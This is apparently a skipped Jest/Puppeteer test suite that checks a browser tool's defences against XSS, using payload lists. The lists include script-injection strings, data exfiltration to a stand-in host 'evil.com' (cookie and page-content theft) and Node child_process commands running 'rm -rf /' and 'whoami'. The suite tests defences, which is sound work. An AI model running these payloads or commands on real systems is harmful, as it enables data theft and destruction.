import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';
import { Browser, Page } from 'puppeteer';
import { launchBrowser } from '../../helpers/browser-launcher.js';

// TODO: Fix these tests - external URL navigation timing out in CI
describe.skip('XSS Prevention Tests', () => {
  let browser: Browser;
  let page: Page;

  beforeAll(async () => {
    browser = await launchBrowser();
    page = await browser.newPage();
  });

  afterAll(async () => {
    if (browser) {
      await browser.close();
    }
  });

  describe('URL Parameter XSS Tests', () => {
    it('should prevent XSS through URL parameters', async () => {
      // Use a smaller, more focused set of XSS payloads for faster testing
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '"><script>alert(1)</script>',
        '<svg/onload=alert(1)>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
      ];

      // Use a simple test page with data URL to avoid external dependencies
      const testHtml = `
        <!DOCTYPE html>
        <html>
        <head><title>XSS Test</title></head>
        <body>
          <h1>XSS Prevention Test</h1>
          <div id="param-display"></div>
          <script>
            const params = new URLSearchParams(window.location.search);
            const paramValue = params.get('param');
            if (paramValue) {
              // Properly escape the parameter to prevent XSS
              document.getElementById('param-display').textContent = paramValue;
            }
          </script>
        </body>
        </html>
      `;

      const dataUrl = `data:text/html,${encodeURIComponent(testHtml)}`;

      for (const payload of xssPayloads) {
        try {
          // Test navigation with XSS payload using data URL
          const response = await page.goto(`${dataUrl}?param=${encodeURIComponent(payload)}`, {
            waitUntil: 'domcontentloaded',
            timeout: 3000,
          });

          // Check if page loaded
          expect(response?.status()).toBe(200);

          // Check for alert dialogs with shorter timeout
          const alertFired = await new Promise((resolve) => {
            page.once('dialog', () => resolve(true));
            setTimeout(() => resolve(false), 500);
          });

          expect(alertFired).toBe(false);

          // Check page content doesn't contain unescaped payload
          const content = await page.content();
          expect(content).not.toContain('<script>alert');
          expect(content).not.toContain('javascript:alert');
          expect(content).not.toContain('onerror=alert');
          expect(content).not.toContain('onload=alert');
        } catch (error: any) {
          // Some payloads might cause navigation errors, which is expected
          if (error.message.includes('timeout')) {
            console.warn(`Test timed out for payload: ${payload}`);
          }
        }
      }
    });

    it('should sanitize script injection in selectors', async () => {
      const testHtml = `
        <!DOCTYPE html>
        <html>
        <head><title>Selector Test</title></head>
        <body>
          <h1>Selector XSS Test</h1>
          <div id="test-div">Test Content</div>
          <input id="test-input" type="text" value="test">
          <button id="test-button">Test Button</button>
        </body>
        </html>
      `;

      const dataUrl = `data:text/html,${encodeURIComponent(testHtml)}`;
      await page.goto(dataUrl, { waitUntil: 'domcontentloaded', timeout: 3000 });

      const maliciousSelectors = [
        '"><script>alert(1)</script>',
        "' or '1'='1",
        '`; alert(1); //`',
        '${alert(1)}',
        "{{constructor.constructor('alert(1)')()}}",
        'img[src=x onerror=alert(1)]',
        '*[onclick="alert(1)"]',
        'a[href="javascript:alert(1)"]',
      ];

      for (const selector of maliciousSelectors) {
        try {
          // Attempt to use malicious selector
          const elements = await page.$$(selector);

          // If selector is processed, it should return empty or throw error
          expect(elements.length).toBe(0);
        } catch (error) {
          // Invalid selectors should throw errors
          expect(error).toBeDefined();
        }
      }
    });

    it('should prevent script execution through evaluate', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const dangerousScripts = [
        'window.location = "http://evil.com"',
        'document.cookie = "stolen=" + document.cookie',
        'fetch("http://evil.com/steal?data=" + document.body.innerHTML)',
        'require("child_process").exec("rm -rf /")',
        'process.exit()',
        'global.process.mainModule.require("child_process").exec("whoami")',
        'this.constructor.constructor("return process")().exit()',
        'eval("alert(1)")',
        'Function("alert(1)")()',
        'setTimeout("alert(1)", 0)',
        'setInterval("alert(1)", 1000)',
        'new Function("alert(1)")()',
      ];

      for (const script of dangerousScripts) {
        try {
          // Scripts should be executed in a sandboxed context
          const result = await page.evaluate(script);

          // Check that dangerous operations didn't succeed
          const url = await page.url();
          expect(url).toContain('williamzujkowski.github.io');

          // Check cookies weren't modified
          const cookies = await page.cookies();
          expect(cookies).not.toContainEqual(expect.objectContaining({ name: 'stolen' }));
        } catch (error) {
          // Some scripts should throw errors, which is expected
          expect(error).toBeDefined();
        }
      }
    }, 120000);

    it('should sanitize HTML injection', async () => {
      const testHtml = `
        <!DOCTYPE html>
        <html>
        <head><title>HTML Injection Test</title></head>
        <body>
          <h1>HTML Injection Test</h1>
          <div id="injection-test"></div>
        </body>
        </html>
      `;

      const dataUrl = `data:text/html,${encodeURIComponent(testHtml)}`;
      await page.goto(dataUrl, { waitUntil: 'domcontentloaded', timeout: 3000 });

      const htmlPayloads = [
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
        '<script>alert(1)</script>',
        '<link rel="import" href="http://evil.com/xss.html">',
        '<meta http-equiv="refresh" content="0; url=http://evil.com">',
        '<base href="http://evil.com/">',
        '<form action="http://evil.com"><input name="data" value="stolen"></form>',
        '<!--[if IE]><script>alert(1)</script><![endif]-->',
        '<style>@import "http://evil.com/xss.css";</style>',
        '<style>body{background:url("javascript:alert(1)")}</style>',
      ];

      for (const payload of htmlPayloads) {
        // Test setting innerHTML
        await page.evaluate((html) => {
          const div = document.createElement('div');
          div.innerHTML = html;
          document.body.appendChild(div);
        }, payload);

        // Check for alert dialogs
        const alertFired = await new Promise((resolve) => {
          page.once('dialog', () => resolve(true));
          setTimeout(() => resolve(false), 500);
        });

        expect(alertFired).toBe(false);

        // Clean up
        await page.evaluate(() => {
          document.body.lastElementChild?.remove();
        });
      }
    }, 120000);

    it('should prevent DOM-based XSS', async () => {
      const testHtml = `
        <!DOCTYPE html>
        <html>
        <head><title>DOM-based XSS Test</title></head>
        <body>
          <h1>DOM-based XSS Test</h1>
          <div id="dom-test"></div>
        </body>
        </html>
      `;

      const dataUrl = `data:text/html,${encodeURIComponent(testHtml)}`;
      await page.goto(dataUrl, { waitUntil: 'domcontentloaded', timeout: 3000 });

      const domXSSTests = [
        // Test location.hash manipulation
        async () => {
          await page.evaluate(() => {
            window.location.hash = '<img src=x onerror=alert(1)>';
          });
          const hash = await page.evaluate(() => window.location.hash);
          expect(hash).toBe('#%3Cimg%20src=x%20onerror=alert(1)%3E');
        },
        // Test document.write
        async () => {
          const writeBlocked = await page.evaluate(() => {
            try {
              document.write('<script>alert(1)</script>');
              return false;
            } catch {
              return true;
            }
          });
          expect(writeBlocked).toBe(true);
        },
        // Test innerHTML on various elements
        async () => {
          const elements = ['div', 'span', 'p', 'h1', 'td', 'li'];
          for (const tag of elements) {
            await page.evaluate((tagName) => {
              const el = document.createElement(tagName);
              el.innerHTML = '<img src=x onerror=alert(1)>';
              document.body.appendChild(el);
            }, tag);

            const alertFired = await new Promise((resolve) => {
              page.once('dialog', () => resolve(true));
              setTimeout(() => resolve(false), 100);
            });

            expect(alertFired).toBe(false);
          }
        },
      ];

      for (const test of domXSSTests) {
        await test();
      }
    });

    it('should prevent stored XSS through localStorage', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const xssPayloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '<svg onload=alert(1)>',
      ];

      for (const payload of xssPayloads) {
        // Store XSS payload
        await page.evaluate((xss) => {
          localStorage.setItem('xssTest', xss);
        }, payload);

        // Reload page to test stored XSS
        await page.reload();

        // Check if stored payload gets executed
        const alertFired = await new Promise((resolve) => {
          page.once('dialog', () => resolve(true));
          setTimeout(() => resolve(false), 1000);
        });

        expect(alertFired).toBe(false);

        // Clean up
        await page.evaluate(() => {
          localStorage.removeItem('xssTest');
        });
      }
    });
  });
});
